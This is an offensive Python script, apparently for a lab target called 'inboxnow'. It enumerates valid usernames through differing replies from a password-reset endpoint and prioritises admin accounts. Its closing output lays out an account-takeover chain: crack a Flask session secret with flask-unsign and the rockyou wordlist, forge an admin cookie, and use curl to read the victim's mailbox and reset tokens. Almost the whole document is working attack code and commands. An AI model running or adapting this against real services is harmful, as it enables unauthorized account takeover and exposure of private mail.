```python
#!/usr/bin/env python3
"""
enum_inboxnow.py — user enumeration via /forgot response differential.

Distinguisher: presence of the success phrase
  "A reset link has been sent to your email address — check your inbox."

Baselines:
  valid   = 'user'         (we have credentials -> must trigger success)
  invalid = 'asfasfsads'   (should NOT trigger success)
"""
import argparse
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

BASE           = "http://10.110.3.72:8070"
FORGOT         = f"{BASE}/forgot"
VALID_USER     = "user"
INVALID_USER   = "asfasfsads"
DEFAULT_WORDS  = "/usr/share/dirb/wordlists/common.txt"

# Distinctive phrases from the success message.  Avoid "reset link" alone —
# the <button>text is "Send reset link", so it appears on every page.
SUCCESS_MARKERS = [
    "reset link has been sent",
    "check your inbox",
]
FAILURE_MARKERS = [
    "no such user",
    "user not found",
    "unknown user",
    "could not send",
    "invalid user",
    "does not exist",
]


def post_forgot(username, timeout=6):
    try:
        r = requests.post(FORGOT, data={"username": username}, timeout=timeout)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def body_text(html_body):
    """Strip tags and collapse whitespace — for readable comparison/log."""
    txt = re.sub(r"<script.*?</script>", " ", html_body or "", flags=re.S | re.I)
    txt = re.sub(r"<style.*?</style>",   " ", txt, flags=re.S | re.I)
    txt = re.sub(r"<[^>]+>", " ", txt)
    return re.sub(r"\s+", " ", txt).strip()


def has_success(body):
    b = (body or "").lower()
    return any(m in b for m in SUCCESS_MARKERS)


def has_failure(body):
    b = (body or "").lower()
    return any(m in b for m in FAILURE_MARKERS)


def show_response(body, n=140):
    return body_text(body)[:n]


def baseline():
    print("=" * 72)
    print("Baselines")
    print("=" * 72)

    s1, b1 = post_forgot(VALID_USER)
    s2, b2 = post_forgot(INVALID_USER)

    print(f"  valid   [{VALID_USER!r}]   status={s1}  len={len(b1 or '')}  "
          f"success={has_success(b1)}  failure={has_failure(b1)}")
    print(f"      {show_response(b1)}")
    print()
    print(f"  invalid [{INVALID_USER!r}] status={s2}  len={len(b2 or '')}  "
          f"success={has_success(b2)}  failure={has_failure(b2)}")
    print(f"      {show_response(b2)}")

    # We need *some* difference.  Best case: success marker flips.
    if has_success(b1) and not has_success(b2):
        print("\n[+] Marker discriminator OK — using SUCCESS_MARKERS.")
        return ("marker", has_success, len(b1), len(b2))

    # Fallback: body length delta (only if > 15 bytes different)
    if abs(len(b1) - len(b2)) > 15:
        print(f"\n[+] No marker flip, using LENGTH delta "
              f"({len(b1)} vs {len(b2)}).")
        return ("length", None, len(b1), len(b2))

    print("\n[-] No usable discriminator between valid and invalid responses.")
    print("    Inspect both responses manually before continuing.")
    sys.exit(2)


def load_wordlist(path, extras):
    words, seen = [], set()
    for w in extras:
        if w and w not in seen:
            words.append(w); seen.add(w)
    with open(path) as f:
        for line in f:
            w = line.strip()
            if not w or w.startswith(".") or w.startswith("/") or w in seen:
                continue
            # skip binary-ish noise
            if any(ord(c) < 32 for c in w):
                continue
            words.append(w); seen.add(w)
    return words


def classify(word, mode, success_fn, v_len, i_len):
    status, body = post_forgot(word)
    if status is None:
        return (word, "ERR", body[:60])
    if mode == "marker":
        if success_fn(body):
            return (word, "VALID", show_response(body, 80))
        return (word, None, None)
    # length mode
    if abs(len(body) - v_len) <= 3 and abs(len(body) - i_len) > 15:
        return (word, "VALID?", show_response(body, 80))
    return (word, None, None)


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--wordlist", default=DEFAULT_WORDS)
    ap.add_argument("--workers", type=int, default=15)
    ap.add_argument("--out", default="/tmp/inboxnow_users.txt")
    ap.add_argument("--reset-admin", action="store_true",
                    help="after enum, request reset for the first priority hit")
    args = ap.parse_args()

    mode, success_fn, v_len, i_len = baseline()

    # Priority list — 'postmaster' is mentioned in the page footer
    extras = [
        "postmaster", "postmaster@inboxnow.local",
        "admin", "root", "administrator", "Admin", "Postmaster",
        "user", "test", "guest", "info", "support", "webmaster",
        "mail", "helpdesk",
    ]
    words = load_wordlist(args.wordlist, extras)
    print(f"\n[*] Queued {len(words)} candidates "
          f"({len(extras)} priority + wordlist)")

    found = []
    checked = 0
    t0 = time.time()

    print(f"\n{'='*72}\nEnumerating (workers={args.workers})\n{'='*72}")
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = {ex.submit(classify, w, mode, success_fn, v_len, i_len): w
                   for w in words}
        for fut in as_completed(futures):
            checked += 1
            w, verdict, detail = fut.result()
            if verdict:
                print(f"  [+] {w:<25} {verdict:<8} {detail}")
                found.append((w, verdict, detail))
            if checked % 250 == 0:
                rate = checked / max(time.time() - t0, 0.01)
                print(f"      … {checked}/{len(words)}  ({rate:.0f}/s)")

    dt = time.time() - t0
    print(f"\n[*] Done: {checked} checked in {dt:.1f}s.  {len(found)} hit(s).")

    if not found:
        print("\n[-] No valid users found.  Possibilities:")
        print("    - Different username field format (email instead of name)")
        print("    - Rate-limit / WAF kicked in mid-scan (try --workers 5)")
        sys.exit(1)

    # ---- Summary + high-value highlighting ----
    priority = {"postmaster", "admin", "root", "administrator", "helpdesk"}
    high = [(w, v, d) for w, v, d in found if w.lower() in priority]

    print(f"\n{'='*72}\nVALID USERS\n{'='*72}")
    for w, v, d in found:
        tag = "  ←  PRIORITY" if w.lower() in priority else ""
        print(f"  {w:<25} {v}{tag}")

    with open(args.out, "w") as f:
        for w, _, _ in found:
            f.write(w + "\n")
    print(f"\n[*] Saved to {args.out}")

    if high:
        print(f"\n[!] PRIORITY TARGETS: {[w for w, _, _ in high]}")
        print(f"    Most likely admin: {high[0][0]!r}")
        if args.reset_admin:
            print(f"\n[*] Requesting reset for {high[0][0]!r}…")
            s, b = post_forgot(high[0][0])
            print(f"    status={s}  success={has_success(b)}")
            print(f"    {show_response(b, 200)}")

    # ---- The real takeover path ----
    print(f"\n{'='*72}\nNEXT — take over {high[0][0] if high else 'admin'!r}\n{'='*72}")
    target = high[0][0] if high else 'postmaster'
    print(f"""\
Session cookie is a Flask 'itsdangerous' token (only payload is the
user field).  Crack the SECRET_KEY offline:

    pip install flask-unsign
    COOKIE='<paste the session cookie from your login>'
    flask-unsign --decode --cookie "$COOKIE"
    flask-unsign --unsign --cookie "$COOKIE" \\
        --wordlist /usr/share/wordlists/rockyou.txt

If the key is found, forge an admin session:

    flask-unsign --sign \\
        --cookie "{{'user': '{target}'}}" \\
        --secret '<RECOVERED_SECRET>'

Then curl with that cookie on /mailbox:

    curl -sS -b 'session=<forged>' {BASE}/mailbox

Alternative path — the reset email likely lands in the target's inbox
server-side.  If you can read {target}'s mailbox via
the forged session, look for the reset token in that inbox.""")

if __name__ == "__main__":
    main()
```
